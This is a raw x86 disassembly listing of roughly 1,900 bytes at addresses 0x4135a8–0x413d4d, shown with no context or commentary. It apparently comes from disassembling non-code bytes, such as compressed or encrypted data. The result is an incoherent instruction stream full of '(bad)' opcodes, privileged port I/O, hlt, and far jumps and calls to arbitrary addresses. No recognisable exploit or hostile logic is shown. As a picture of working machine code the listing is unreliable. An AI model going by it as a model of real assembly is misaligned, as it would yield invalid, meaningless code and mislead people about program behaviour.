  4135a8:	mov    cs,WORD PTR [ecx-0x4e]
  4135ab:	inc    edx
  4135ac:	loope  0x413587
  4135ae:	and    ch,al
  4135b0:	dec    edx
  4135b1:	jl     0x4135ab
  4135b3:	jge    0x413583
  4135b5:	in     al,dx
  4135b6:	dec    esp
  4135b7:	pop    esp
  4135b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135b9:	xor    bh,BYTE PTR [edi]
  4135bb:	daa    
  4135bc:	mov    cl,BYTE PTR [esi]
  4135be:	stos   BYTE PTR es:[edi],al
  4135bf:	mov    ebx,DWORD PTR gs:[esp+esi*2-0x1b]
  4135c4:	mov    DWORD PTR [esi+0x2e4e050f],edi
  4135ca:	lahf   
  4135cb:	addr16 add eax,0x3a27eb52
  4135d1:	or     BYTE PTR [edx-0x26de6678],bh
  4135d7:	sub    DWORD PTR [esi+edi*1+0xf3e1a2e],edi
  4135de:	aad    0x9f
  4135e0:	or     ecx,eax
  4135e2:	xor    ah,BYTE PTR [edx]
  4135e4:	daa    
  4135e5:	clc    
  4135e6:	imul   esi,DWORD PTR [ebx+edx*2],0x36486f5
  4135ed:	xor    cl,BYTE PTR [esp+ebp*1+0xc]
  4135f1:	add    eax,0xe6342777
  4135f6:	aad    0xc0
  4135f8:	int    0x43
  4135fa:	jmp    0x63a95e71
  4135ff:	xchg   esp,eax
  413600:	jp     0x413631
  413602:	int3   
  413603:	cmp    eax,0x6ba9c317
  413608:	pop    edi
  413609:	adc    BYTE PTR [ebx-0x4cbc5349],bh
  41360f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413610:	sbb    cl,BYTE PTR [ebx-0x407ab916]
  413616:	loop   0x4135cf
  413618:	fwait
  413619:	jmp    0x7f74:0xf9ee7e83
  413620:	test   al,0x49
  413622:	psubd  mm7,mm2
  413625:	aas    
  413626:	inc    eax
  413627:	outs   dx,BYTE PTR ds:[esi]
  413628:	imul   ecx,esi,0x313311a9
  41362e:	jg     0x413632
  413630:	rcr    BYTE PTR [edi],cl
  413632:	int3   
  413633:	shl    DWORD PTR [eax+0x45368a94],0xda
  41363a:	inc    ecx
  41363b:	xchg   eax,edx
  41363d:	dec    esi
  41363e:	inc    edi
  41363f:	pushf  
  413640:	and    edx,DWORD PTR [ecx]
  413642:	stos   BYTE PTR es:[edi],al
  413643:	mov    eax,0xa5ee9579
  413648:	or     eax,0x3ac0615e
  41364d:	push   ebx
  41364e:	daa    
  41364f:	inc    edi
  413650:	inc    edi
  413651:	xlat   BYTE PTR ds:[ebx]
  413652:	xchg   esp,eax
  413653:	or     esp,ecx
  413655:	sar    DWORD PTR [ebx+0x17],0x5d
  413659:	les    edx,FWORD PTR [edi+ebp*1+0x26]
  41365d:	retf   0x3129
  413660:	xchg   esp,eax
  413661:	sub    bl,dh
  413663:	jmp    0xd0d1:0x8d267df9
  41366a:	clc    
  41366b:	sbb    DWORD PTR [edx+0x6d],esp
  41366e:	dec    ebp
  41366f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413670:	adc    DWORD PTR [edi-0x219bf27f],edx
  413676:	jg     0x4135fd
  413678:	inc    esi
  413679:	fmulp  st(7),st
  41367b:	not    DWORD PTR [eax+0x6c]
  41367e:	mov    al,0x5c
  413680:	jmp    0x41360d
  413682:	dec    ebx
  413683:	mov    ecx,0x5c80c374
  413688:	dec    edi
  413689:	fdivr  st(6),st
  41368b:	popa   
  41368c:	push   ebp
  41368d:	scas   al,BYTE PTR es:[edi]
  41368e:	std    
  41368f:	push   ebx
  413690:	mov    al,0xbe
  413692:	loope  0x4136ad
  413694:	add    eax,0x9f00b4a3
  413699:	rol    BYTE PTR [ecx-0x556b463d],cl
  41369f:	mov    eax,ds:0xb7c9ff8e
  4136a4:	dec    eax
  4136a5:	imul   edx,DWORD PTR [esp+edx*4+0x1d070e06],0xffffffc4
  4136ad:	stc    
  4136ae:	into   
  4136af:	add    ch,bl
  4136b1:	(bad)  
  4136b2:	mov    eax,0x763b04b1
  4136b7:	push   0x84864295
  4136bc:	call   0xb13ddf10
  4136c1:	push   0xf42f6d5
  4136c6:	out    0x35,al
  4136c8:	scas   eax,DWORD PTR es:[edi]
  4136c9:	lock pop eax
  4136cb:	pop    ebp
  4136cc:	cs mov ecx,0x4468aa0e
  4136d2:	jno    0x4136c5
  4136d4:	jp     0x4136fc
  4136d6:	jo     0x4136c7
  4136d8:	fisub  DWORD PTR ds:0xbdf44c20
  4136de:	test   BYTE PTR [ebx+eiz*2],ch
  4136e1:	fdivr  QWORD PTR [ebx-0x4c79444]
  4136e7:	int    0x3
  4136e9:	mov    ecx,0xf821ae5c
  4136ee:	jb     0x4136ef
  4136f0:	dec    eax
  4136f1:	xchg   ch,ch
  4136f3:	fistp  WORD PTR [ecx+0x2e]
  4136f6:	iret   
  4136f7:	dec    ebx
  4136f8:	clc    
  4136f9:	loopne 0x4136ab
  4136fb:	inc    edi
  4136fc:	sahf   
  4136fd:	stc    
  4136fe:	xor    dl,cl
  413700:	cli    
  413701:	adc    BYTE PTR [ebx],0x42
  413704:	popf   
  413705:	dec    esi
  413706:	shl    DWORD PTR [edx+edi*2],1
  413709:	repz push edx
  41370b:	not    DWORD PTR [edi+0x16a22510]
  413711:	(bad)  
  413712:	sub    ebp,DWORD PTR [eax]
  413714:	dec    ebx
  413715:	and    eax,0x3237f786
  41371a:	fisubr DWORD PTR ds:0x204a9419
  413721:	imul   edi,DWORD PTR [ecx+0x3],0x94e8fec0
  413728:	lock fwait
  41372a:	je     0x4137a5
  41372c:	pop    esi
  41372d:	mov    esi,0x6cedbf2f
  413732:	fs pop eax
  413734:	sbb    al,0x9a
  413736:	fcom   QWORD PTR [ebx-0x69]
  413739:	inc    ebp
  41373a:	xchg   ebp,eax
  41373b:	repz cmp BYTE PTR [ecx-0x49362941],0x4f
  413743:	fldenv [edi+0x5a]
  413746:	sbb    BYTE PTR [ebp+esi*2+0x1a6d53ad],cl
  41374d:	fimul  DWORD PTR [edi-0x66]
  413750:	in     al,dx
  413751:	cs xchg esi,eax
  413753:	(bad)  
  413754:	pop    ecx
  413755:	int3   
  413756:	imul   esi
  413758:	into   
  413759:	test   al,0xc9
  41375b:	push   cs
  41375c:	push   ecx
  41375d:	rcl    BYTE PTR ds:0x9547212f,0x51
  413764:	xchg   edx,eax
  413765:	out    0x33,al
  413767:	and    DWORD PTR [ebx+0x1c],ecx
  41376a:	push   0x4eca0ad9
  41376f:	out    dx,eax
  413770:	stos   DWORD PTR es:[edi],eax
  413771:	iret   
  413772:	push   esp
  413773:	jl     0x4136f6
  413775:	push   edi
  413776:	addr16 jb 0x41372b
  413779:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41377a:	pop    ecx
  41377b:	mov    eax,ds:0xff5768ad
  413780:	pop    esi
  413781:	aas    
  413782:	scas   eax,DWORD PTR es:[edi]
  413783:	mov    al,al
  413785:	cmp    ecx,DWORD PTR [esi-0x2b]
  413788:	dec    esp
  41378a:	clc    
  41378b:	pop    es
  41378c:	adc    BYTE PTR [ebp+0x70],bl
  41378f:	rol    dl,0xc0
  413792:	pop    es
  413793:	das    
  413794:	mov    dh,0x29
  413796:	mov    al,0x7f
  413798:	or     bl,dl
  41379a:	jmp    0x413765
  41379c:	xchg   ecx,eax
  41379d:	in     al,dx
  41379e:	or     cl,BYTE PTR [ebx]
  4137a0:	mov    bh,BYTE PTR [eax+0x8]
  4137a3:	adc    al,0xe0
  4137a5:	jmp    0xcac:0x67d63eed
  4137ac:	xor    ecx,eax
  4137ae:	aam    0xb6
  4137b0:	adc    al,0xa
  4137b2:	add    esi,DWORD PTR [eax]
  4137b4:	push   0xffffffb3
  4137b6:	sub    al,0xec
  4137b8:	jbe    0x413829
  4137ba:	je     0x413745
  4137bc:	pop    ss
  4137bd:	sbb    al,0xa2
  4137bf:	(bad)  
  4137c0:	sbb    BYTE PTR [ebx-0x24],al
  4137c3:	aas    
  4137c4:	(bad)  
  4137c5:	nop
  4137c6:	inc    ebp
  4137c7:	out    dx,al
  4137c8:	sahf   
  4137c9:	sub    al,0x2
  4137cb:	dec    esp
  4137cc:	arpl   WORD PTR [esi],si
  4137ce:	jl     0x4137d3
  4137d0:	jp     0x41378b
  4137d2:	xor    ah,al
  4137d4:	aas    
  4137d5:	mov    al,ds:0x3533ec48
  4137da:	mov    eax,0x8ccc29f6
  4137df:	mov    ch,0xe9
  4137e1:	mov    dl,0x8a
  4137e3:	jne    0x4137fc
  4137e5:	std    
  4137e6:	mov    ecx,0x73657307
  4137eb:	das    
  4137ec:	pop    ebp
  4137ed:	and    esp,DWORD PTR [esi]
  4137ef:	xchg   ebp,eax
  4137f0:	pop    edx
  4137f1:	test   eax,0xa356fcca
  4137f6:	out    0x41,eax
  4137f8:	in     al,0xfc
  4137fa:	dec    ebp
  4137fb:	aaa    
  4137fc:	std    
  4137fd:	adc    BYTE PTR [esi+0x7f912413],al
  413803:	dec    edi
  413804:	imul   BYTE PTR ds:0x7b75df3f
  41380a:	mov    al,0xa3
  41380c:	int3   
  41380d:	outs   dx,BYTE PTR ds:[esi]
  41380e:	sub    al,0xda
  413810:	jae    0x4137bf
  413812:	jbe    0x413825
  413814:	cmp    al,0x42
  413816:	xchg   DWORD PTR ds:0x9296869f,ebp
  41381c:	jp     0x413874
  41381e:	cmc    
  41381f:	mov    ds:0xf164b7cb,al
  413824:	cli    
  413825:	fld    QWORD PTR ds:0xab342a1e
  41382b:	and    eax,0xe7714e69
  413830:	add    eax,0x410ca8f9
  413835:	pop    ds
  413836:	ror    BYTE PTR [eax-0x34],0x29
  41383a:	stos   BYTE PTR es:[edi],al
  41383b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41383c:	fwait
  41383d:	outs   dx,BYTE PTR ds:[esi]
  41383e:	ja     0x413820
  413840:	jb     0x41388e
  413842:	nop
  413843:	outs   dx,DWORD PTR ds:[esi]
  413844:	lahf   
  413845:	loope  0x413810
  413847:	test   BYTE PTR [edi],ah
  413849:	cld    
  41384a:	push   ebx
  41384b:	popf   
  41384c:	cmp    eax,0x9165daba
  413851:	sti    
  413852:	imul   ecx,DWORD PTR [ecx+0x1d712712],0x31
  413859:	je     0x413897
  41385b:	mov    ebp,0x81ad9e1c
  413860:	ficomp DWORD PTR [edx-0x67]
  413863:	mov    ds:0xf5f599c9,eax
  413868:	xchg   esi,eax
  413869:	in     eax,0x3a
  41386b:	test   DWORD PTR [edx-0x6c],esi
  41386e:	repnz cwde 
  413870:	pop    ss
  413871:	mov    al,ds:0x958f2a60
  413876:	jmp    0x41388b
  413878:	(bad)  
  413879:	mov    cl,0x4c
  41387b:	and    cl,BYTE PTR [ebp+0x5f]
  41387e:	mov    ch,0x2d
  413880:	sti    
  413881:	push   esp
  413882:	(bad)  
  413883:	fisttp QWORD PTR [edi-0x3e]
  413886:	sti    
  413887:	ss fiadd WORD PTR es:[ecx]
  41388b:	jmp    0xbbd5:0xa806185b
  413892:	xchg   ebx,eax
  413893:	sbb    dl,BYTE PTR [ebp-0x28]
  413896:	(bad)  
  413897:	rcl    dl,1
  413899:	or     DWORD PTR [edx-0x1e],ecx
  41389c:	out    0x36,eax
  41389e:	push   esi
  41389f:	and    eax,0xb544cddb
  4138a4:	xchg   esp,eax
  4138a5:	dec    esp
  4138a6:	push   ds
  4138a7:	arpl   ax,bp
  4138a9:	sbb    bl,BYTE PTR [eax]
  4138ab:	pop    edi
  4138ac:	in     al,dx
  4138ad:	pop    ecx
  4138ae:	mov    bl,0xcf
  4138b0:	aaa    
  4138b1:	mov    cl,0x46
  4138b3:	or     dl,BYTE PTR [ecx]
  4138b5:	push   cs
  4138b6:	jb     0x413922
  4138b8:	repz test DWORD PTR [ebx+0x5b],ebx
  4138bc:	test   al,0x5e
  4138be:	cli    
  4138bf:	mov    WORD PTR [ecx-0x24],?
  4138c2:	sbb    bl,BYTE PTR [ebx-0x7d24e729]
  4138c8:	sbb    edi,DWORD PTR [ecx]
  4138ca:	add    BYTE PTR [edi],bl
  4138cc:	adc    BYTE PTR [esi],cl
  4138ce:	mov    ebp,0xc784d22d
  4138d3:	mov    dl,0xfb
  4138d5:	xchg   edi,ebx
  4138d7:	mov    ah,0x91
  4138d9:	das    
  4138da:	jae    0x413908
  4138dc:	ja     0x4138a6
  4138de:	sub    al,0xad
  4138e0:	xchg   BYTE PTR [ecx],ch
  4138e2:	in     eax,0xc6
  4138e4:	cmc    
  4138e5:	adc    eax,DWORD PTR [esi-0x2d2fde31]
  4138eb:	adc    BYTE PTR [ebx],0xab
  4138ee:	ins    DWORD PTR es:[edi],dx
  4138ef:	shr    BYTE PTR [edi],1
  4138f1:	mov    ebp,0x4943d4fd
  4138f6:	mov    edi,0xc46475f8
  4138fb:	mov    ah,BYTE PTR [edx+0x34c4691f]
  413901:	mov    edi,0xad9caaa8
  413906:	aaa    
  413907:	inc    esi
  413908:	(bad)  
  41390a:	sbb    eax,0x1b727fc1
  41390f:	fcom   DWORD PTR [ebp-0x30b45944]
  413915:	xchg   ebp,eax
  413916:	popa   
  413917:	adc    ch,BYTE PTR [eax-0x74]
  41391a:	or     BYTE PTR [ebp-0x35],al
  41391d:	push   DWORD PTR ds:0x1025e42b
  413923:	mov    eax,ds:0x632ab218
  413928:	unpcklps xmm5,XMMWORD PTR [edi+edx*8]
  41392c:	pop    ebp
  41392d:	lods   al,BYTE PTR ds:[esi]
  41392e:	outs   dx,DWORD PTR ds:[esi]
  41392f:	and    al,cl
  413931:	aam    0x20
  413933:	or     bl,BYTE PTR [esi+0x0]
  413936:	rol    DWORD PTR ds:0x76688b06,cl
  41393c:	cmp    al,0x5a
  41393e:	jbe    0x41397f
  413940:	mov    bl,0x34
  413942:	sbb    ah,BYTE PTR [ebx+0xd]
  413945:	pop    edi
  413946:	and    BYTE PTR [edi-0x42557f24],al
  41394c:	aam    0xca
  41394e:	fiadd  WORD PTR [edi-0x5f]
  413951:	xchg   ebp,eax
  413952:	enter  0x4149,0xbd
  413956:	out    dx,eax
  413957:	es mov cl,0x47
  41395a:	push   esp
  41395b:	retf   0x71f8
  41395e:	pop    esp
  41395f:	mov    BYTE PTR [ecx],bh
  413961:	and    bl,BYTE PTR [ecx+ecx*1-0x68]
  413965:	jmp    0xaff2:0x2379cb6b
  41396c:	dec    esi
  41396d:	cmp    al,0x17
  41396f:	ror    BYTE PTR [esi+0x3060e764],1
  413975:	ja     0x413978
  413977:	mov    dl,0x5f
  413979:	mov    es,WORD PTR [edi-0x7a]
  41397c:	push   cs
  41397d:	and    bh,BYTE PTR cs:[esi+0x1a]
  413981:	test   al,0x19
  413983:	in     eax,0xa9
  413985:	dec    ebx
  413986:	xchg   esi,eax
  413987:	fdivr  DWORD PTR [edx]
  413989:	retf   0x51a4
  41398c:	std    
  41398d:	ret    0xdf2
  413990:	dec    ebp
  413991:	xchg   ebx,eax
  413992:	cmp    eax,0x35236cb8
  413997:	shl    ebx,0x66
  41399a:	pop    es
  41399b:	aaa    
  41399c:	push   0xfdc35ad0
  4139a1:	aaa    
  4139a2:	into   
  4139a3:	or     al,0xdc
  4139a5:	ins    DWORD PTR es:[edi],dx
  4139a6:	mov    ebp,0xded0c3e
  4139ab:	repnz cmc 
  4139ad:	imul   edx,esi,0xa02f3cd6
  4139b3:	mov    BYTE PTR ds:0xc6ffedf9,cl
  4139b9:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139bb:	add    BYTE PTR [ebx-0x1f],ah
  4139be:	and    DWORD PTR [ebx-0x5e],ebp
  4139c1:	lahf   
  4139c2:	ficom  DWORD PTR [ecx-0x704937ae]
  4139c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139c9:	rcr    BYTE PTR [esi],0x66
  4139cc:	rcl    BYTE PTR [ebx+0x9],1
  4139cf:	adc    DWORD PTR ds:0x7a9a22fd,edx
  4139d5:	out    dx,al
  4139d6:	cli    
  4139d7:	adc    BYTE PTR [eax+ebx*8],0x1d
  4139db:	push   es
  4139dc:	and    eax,0x5e27c11c
  4139e1:	push   0xffffffba
  4139e3:	add    BYTE PTR [ecx+0x62],dl
  4139e6:	mov    edx,0xd86bd1bb
  4139eb:	inc    eax
  4139ec:	or     cl,BYTE PTR [edx]
  4139ee:	inc    edx
  4139ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139f0:	lods   eax,DWORD PTR ds:[esi]
  4139f1:	gs cld 
  4139f3:	dec    ebp
  4139f4:	push   ds
  4139f5:	fld    DWORD PTR [ebp-0x3bff9e37]
  4139fb:	jae    0x413a7a
  4139fd:	nop
  4139fe:	fstp   TBYTE PTR [esi-0x42cd3625]
  413a04:	or     ebx,esi
  413a06:	stc    
  413a07:	lods   eax,DWORD PTR ds:[esi]
  413a08:	dec    esp
  413a09:	fsubr  st(7),st
  413a0b:	lds    esp,FWORD PTR [edi-0x55f70cc0]
  413a11:	js     0x413a4a
  413a13:	adc    al,0x73
  413a15:	shr    ebx,0x72
  413a18:	inc    ebp
  413a19:	dec    esp
  413a1a:	xchg   ebp,eax
  413a1b:	or     eax,0x850292e5
  413a20:	lods   eax,DWORD PTR ds:[esi]
  413a21:	ja     0x4139b1
  413a23:	rol    BYTE PTR [esi+0x2e],0xde
  413a27:	pushf  
  413a28:	or     bh,BYTE PTR [ecx]
  413a2a:	push   ecx
  413a2b:	push   ss
  413a2c:	cmp    ebx,DWORD PTR [esp+ebx*8]
  413a2f:	xor    DWORD PTR [edx-0x46ae92eb],ebp
  413a35:	push   esp
  413a36:	push   0xffffffd5
  413a38:	fldpi  
  413a3a:	out    dx,al
  413a3b:	mov    ebx,0xd680766f
  413a40:	inc    ebp
  413a41:	mov    al,BYTE PTR [eax-0x28]
  413a44:	push   es
  413a45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a46:	rol    DWORD PTR [ecx+ebp*8-0xb],0xf
  413a4b:	xchg   edi,eax
  413a4c:	mov    bh,ah
  413a4e:	in     al,dx
  413a4f:	adc    al,0x1b
  413a51:	dec    esi
  413a52:	loope  0x4139da
  413a54:	or     DWORD PTR [edi],eax
  413a56:	add    eax,0x4fe5b2fa
  413a5b:	sub    DWORD PTR [ebx-0x3e993989],esp
  413a61:	and    al,0x64
  413a63:	or     eax,0x34a63c22
  413a68:	shr    BYTE PTR [edi-0x1dc1fc22],cl
  413a6e:	and    DWORD PTR [ebp-0x14],eax
  413a71:	(bad)  
  413a72:	jp     0x413a0d
  413a74:	jae    0x413ace
  413a76:	mov    ds:0xeb64ffda,eax
  413a7b:	ss fadd st(6),st
  413a7e:	mov    ds:0x3757d1ee,eax
  413a83:	mov    cl,0x46
  413a85:	adc    BYTE PTR [edx],ch
  413a87:	push   ds
  413a88:	xchg   edx,eax
  413a89:	fstp   TBYTE PTR ds:0xafe59525
  413a8f:	adc    eax,0xce913bd7
  413a94:	bound  esp,QWORD PTR [eax-0x4b]
  413a97:	xchg   edi,eax
  413a98:	add    BYTE PTR [ecx+0x383a1ae8],al
  413a9e:	mov    eax,ds:0x8f8a0e67
  413aa3:	push   ecx
  413aa4:	neg    DWORD PTR ds:0x3ba9ee1c
  413aaa:	ficomp WORD PTR [eax]
  413aac:	push   ebx
  413aad:	push   eax
  413aae:	and    BYTE PTR [ebx-0xc],ah
  413ab1:	into   
  413ab2:	int    0xa4
  413ab4:	inc    esi
  413ab5:	retf   
  413ab6:	mov    es,esi
  413ab8:	push   es
  413ab9:	dec    edx
  413aba:	loopne 0x413b13
  413abc:	cmc    
  413abd:	shl    ah,0x20
  413ac0:	xchg   ecx,eax
  413ac1:	jecxz  0x413ae2
  413ac3:	inc    esi
  413ac4:	add    al,BYTE PTR [eax+0x35eb0ca4]
  413aca:	fcmovnbe st,st(5)
  413acc:	xor    DWORD PTR [edx+0x67e68f50],0x9351beeb
  413ad6:	jl     0x413aef
  413ad8:	xlat   BYTE PTR ds:[ebx]
  413ad9:	push   ebp
  413ada:	cmp    BYTE PTR [edi],dl
  413adc:	jmp    0x413a90
  413ade:	call   0x4c6ec374
  413ae3:	mov    bh,0xc0
  413ae5:	or     al,0x50
  413ae7:	add    DWORD PTR [edi],0xffffffd3
  413aea:	add    al,0xaa
  413aec:	adc    eax,0x594979fd
  413af1:	sub    edi,DWORD PTR [edx+0x6c]
  413af4:	ins    DWORD PTR es:[edi],dx
  413af5:	mov    edx,0x9048f842
  413afa:	pop    ss
  413afb:	jb     0x413b4f
  413afd:	pushf  
  413afe:	pushf  
  413aff:	sub    dh,bh
  413b01:	bnd jb 0x413a96
  413b04:	(bad)  
  413b05:	add    BYTE PTR [ebx-0x4e],al
  413b08:	sub    eax,eax
  413b0a:	mov    esp,0xbe056ccb
  413b0f:	ret    0xbf21
  413b12:	movsx  ebp,WORD PTR [edi-0x3]
  413b16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b17:	ins    DWORD PTR es:[edi],dx
  413b18:	push   0x3158ef2a
  413b1d:	adc    esi,edx
  413b1f:	dec    ebx
  413b20:	push   es
  413b21:	lea    eax,[edx-0x48]
  413b24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b25:	(bad)  [edx+edx*2+0x2f]
  413b29:	adc    al,0x40
  413b2b:	jne    0x413b1b
  413b2d:	mov    ebp,0xd26a0e13
  413b32:	mov    esi,0x580dd618
  413b38:	(bad)  
  413b39:	popa   
  413b3a:	push   ss
  413b3b:	mov    ecx,0x4361011e
  413b40:	outs   dx,DWORD PTR ds:[esi]
  413b41:	jne    0x413b4f
  413b43:	push   cs
  413b44:	xlat   BYTE PTR ds:[ebx]
  413b45:	push   ecx
  413b46:	mul    eax
  413b48:	add    ecx,DWORD PTR fs:[edi+0x6c]
  413b4c:	shl    BYTE PTR [edx+0x3089594a],0xf7
  413b53:	out    0x26,al
  413b55:	sub    edi,ecx
  413b57:	enter  0x24b4,0xab
  413b5b:	bswap  ebp
  413b5d:	retf   
  413b5e:	jno    0x413b96
  413b60:	inc    esp
  413b61:	mov    al,0x7f
  413b63:	sbb    edx,DWORD PTR [eax+0x44]
  413b66:	add    bh,BYTE PTR [edi-0x6a]
  413b69:	pushf  
  413b6a:	leave  
  413b6b:	jmp    0x413bb5
  413b6d:	xor    dh,BYTE PTR [edx]
  413b6f:	mov    ebx,0xcae29139
  413b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b75:	add    BYTE PTR [ebx],bl
  413b77:	lds    edi,FWORD PTR [eax+0x782c33e7]
  413b7d:	jge    0x413b69
  413b7f:	mov    esp,0x6e1af82
  413b84:	sbb    BYTE PTR ds:0x712aada6,bl
  413b8a:	and    al,BYTE PTR [edx-0x62d0d686]
  413b90:	inc    esi
  413b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b92:	mov    ds:0x2856861c,al
  413b97:	xchg   BYTE PTR [edi+edi*8-0x48],ah
  413b9b:	xchg   ebp,eax
  413b9c:	outs   dx,BYTE PTR ds:[esi]
  413b9d:	fs pop ebp
  413b9f:	sub    al,0x6d
  413ba1:	dec    esi
  413ba2:	inc    ebp
  413ba3:	and    ebp,eax
  413ba5:	cmp    ebp,DWORD PTR [edi]
  413ba7:	add    DWORD PTR [edi],esp
  413ba9:	push   edi
  413baa:	mov    esi,0xa3356cdd
  413baf:	jmp    0xe6c0669e
  413bb4:	cmp    al,0xb3
  413bb6:	mov    bh,0x55
  413bb8:	mov    al,ds:0xed593acb
  413bbd:	mov    ch,0xcd
  413bbf:	and    edx,edi
  413bc1:	in     eax,0xf4
  413bc3:	(bad)  
  413bc4:	in     eax,0xbb
  413bc6:	das    
  413bc7:	mov    cs,WORD PTR [ebp+ebp*1+0x16471f8c]
  413bce:	sbb    eax,0xacd9fa39
  413bd3:	popa   
  413bd4:	and    ebx,DWORD PTR [ebx+edi*1-0x38674ab5]
  413bdb:	adc    al,0x8c
  413bdd:	in     al,dx
  413bde:	mov    ecx,0xd3d404e1
  413be3:	(bad)  
  413be4:	mov    ch,0xa3
  413be6:	xor    ebx,0x307b1ed
  413bec:	push   0xa64113a7
  413bf1:	mov    ebp,0x920d66db
  413bf6:	repnz xlat BYTE PTR ds:[ebx]
  413bf8:	cmp    al,0xe4
  413bfa:	test   BYTE PTR [ebx-0x2f],bh
  413bfd:	inc    ecx
  413bfe:	pop    edi
  413bff:	addr16 cwde 
  413c01:	icebp  
  413c02:	cld    
  413c03:	pop    ebp
  413c04:	hlt    
  413c05:	push   cs
  413c06:	add    edx,esi
  413c08:	dec    esi
  413c09:	add    BYTE PTR [ecx-0x35],al
  413c0c:	adc    BYTE PTR [edx+eiz*4+0x35],0xb8
  413c11:	xchg   ecx,eax
  413c12:	int3   
  413c13:	imul   edi,DWORD PTR [eax+0x56],0xddac4003
  413c1a:	push   edi
  413c1b:	cmp    eax,0x826835c3
  413c20:	push   edi
  413c21:	outs   dx,BYTE PTR ds:[esi]
  413c22:	mov    BYTE PTR [esi],dl
  413c24:	shl    BYTE PTR [edx-0x3baf1dc2],cl
  413c2a:	inc    esp
  413c2b:	dec    ecx
  413c2c:	ja     0x413bdc
  413c2e:	adc    al,0x20
  413c30:	retf   0x1143
  413c33:	out    0xa4,al
  413c35:	pop    ebx
  413c36:	mov    ds:0x2dd33747,al
  413c3b:	sbb    BYTE PTR [eax-0x1b55aaf9],ah
  413c41:	cmc    
  413c42:	lock (bad) 
  413c44:	push   esp
  413c45:	inc    ebp
  413c46:	(bad)  
  413c47:	mov    al,0x6f
  413c49:	pusha  
  413c4a:	add    ebx,DWORD PTR [eax+0x17]
  413c4d:	rol    al,1
  413c4f:	jne    0x413cc8
  413c51:	mov    edx,0xfa6b41a4
  413c56:	sub    al,0x68
  413c58:	aam    0x40
  413c5a:	adc    DWORD PTR [esi-0x48],edi
  413c5d:	es sub eax,0x65231ea2
  413c64:	mov    esi,0x9e640d1
  413c69:	push   ebp
  413c6a:	dec    ebx
  413c6b:	sbb    BYTE PTR ds:[ecx],dl
  413c6e:	mov    bl,0xe5
  413c70:	mov    bh,0x4e
  413c72:	aaa    
  413c73:	pop    ecx
  413c74:	sub    eax,0xeec45699
  413c79:	in     eax,dx
  413c7a:	test   BYTE PTR [ebx],0xe1
  413c7d:	ja     0x413c4d
  413c7f:	cmp    ecx,ebx
  413c81:	jmp    0x79f2f70d
  413c86:	and    al,BYTE PTR [esi+eax*8+0x3d]
  413c8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c8b:	pop    eax
  413c8c:	nop
  413c8d:	cmp    ah,ah
  413c8f:	or     eax,0xed426514
  413c94:	nop
  413c95:	jae    0x413cb5
  413c97:	fbld   TBYTE PTR [edi+0x3fdc43d2]
  413c9d:	loopne 0x413d0e
  413c9f:	adc    eax,DWORD PTR ds:0x4c840436
  413ca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ca6:	fnstsw WORD PTR [edx+0x28]
  413ca9:	inc    edx
  413caa:	(bad)  
  413cab:	fnstcw WORD PTR [edx-0x7e0952b3]
  413cb1:	mov    bl,0xeb
  413cb3:	out    0xad,al
  413cb5:	push   0x4a
  413cb7:	inc    eax
  413cb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cb9:	and    DWORD PTR [edx+0x26b358a7],esi
  413cbf:	pop    eax
  413cc0:	sbb    BYTE PTR [edx-0x61],dh
  413cc3:	pop    ecx
  413cc4:	inc    edi
  413cc5:	daa    
  413cc6:	outs   dx,DWORD PTR ds:[esi]
  413cc7:	test   eax,0x39e005be
  413ccc:	jbe    0x413d11
  413cce:	(bad)  
  413cd0:	jno    0x413ce8
  413cd2:	cmp    al,0xff
  413cd4:	mov    ah,0xc3
  413cd6:	ss pop edx
  413cd8:	out    0x76,eax
  413cda:	inc    edi
  413cdb:	fdivr  DWORD PTR [edx]
  413cdd:	adc    al,0x4a
  413cdf:	rcl    DWORD PTR [edi+ebp*2+0x75],cl
  413ce3:	or     BYTE PTR [edx],0xe2
  413ce6:	outs   dx,BYTE PTR ds:[esi]
  413ce7:	mov    al,ds:0x7852ea40
  413cec:	adc    cl,BYTE PTR [esp+edi*4]
  413cef:	push   es
  413cf0:	or     ebx,DWORD PTR [eax]
  413cf2:	sbb    DWORD PTR [eax+0xe],0xffffffac
  413cf6:	test   eax,0x97c4a8fb
  413cfb:	jne    0x413cff
  413cfd:	out    0x8e,al
  413cff:	dec    edi
  413d00:	xchg   esp,eax
  413d01:	out    0x94,eax
  413d03:	mov    eax,ds:0xd0b2ba82
  413d08:	cwde   
  413d09:	dec    DWORD PTR [edx]
  413d0b:	mov    esp,es
  413d0d:	not    DWORD PTR [eax-0x4c]
  413d10:	stos   BYTE PTR es:[edi],al
  413d11:	shl    bh,cl
  413d13:	mov    dh,0x98
  413d15:	xchg   BYTE PTR [ebx],bh
  413d17:	hlt    
  413d18:	in     eax,dx
  413d19:	sub    al,dh
  413d1b:	push   ebx
  413d1c:	cmp    ebx,edi
  413d1e:	lods   al,BYTE PTR ds:[esi]
  413d1f:	scas   eax,DWORD PTR es:[edi]
  413d20:	push   esi
  413d21:	fisub  WORD PTR [eax]
  413d23:	pop    ds
  413d24:	lods   eax,DWORD PTR ds:[esi]
  413d25:	mov    ds:0x52f4f3c8,eax
  413d2a:	ror    BYTE PTR [ebp-0x18173db6],1
  413d30:	inc    esp
  413d31:	dec    eax
  413d32:	sbb    al,BYTE PTR [esi]
  413d34:	xor    eax,0x889d63cc
  413d39:	cmp    BYTE PTR [ebp+0x63],bl
  413d3c:	and    dl,0x42
  413d3f:	add    eax,0x59c52d09
  413d44:	or     BYTE PTR [edx+edx*1+0x9],0x3c
  413d49:	into   
  413d4a:	repnz in eax,0xdb
  413d4d:	pop    eax
